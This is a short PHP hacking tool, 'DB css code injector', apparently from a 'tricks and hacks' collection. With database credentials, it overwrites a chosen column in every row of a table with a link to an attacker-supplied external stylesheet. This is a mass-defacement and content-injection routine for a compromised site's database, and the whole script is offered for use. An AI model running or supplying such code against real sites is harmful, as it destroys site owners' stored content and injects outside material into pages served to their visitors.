 <?
#############################
# DB css code injector
# coded By WecodeSolution
# Tricks And hacks
#############################
$host="localhost";//DB Host
$user="Database UserName ";//db username
$pass="Database password";//DB password
$db="Database Name ";//DB name
$table="Table Name  ";//table name + prefix
$column= "Column Name ";//column name
$cssurl="put ur URL Css Code ";//ur css url
########################################################
echo "<title>Hello world , </title>";
$faconnect=@mysql_connect($host,$user,$pass);
$faselect=mysql_select_db($db);
$csscode="<head><link href=$cssurl type=text/css rel=stylesheet>;--</head>";
$faquery = @mysql_query("UPDATE ".$table." SET ".$column." ='".$csscode."' ");
if($faquery)
{
echo "[+] all updated successfully";
}
else
{
echo "[+] oOps . . Updaing error :D";
}
?>
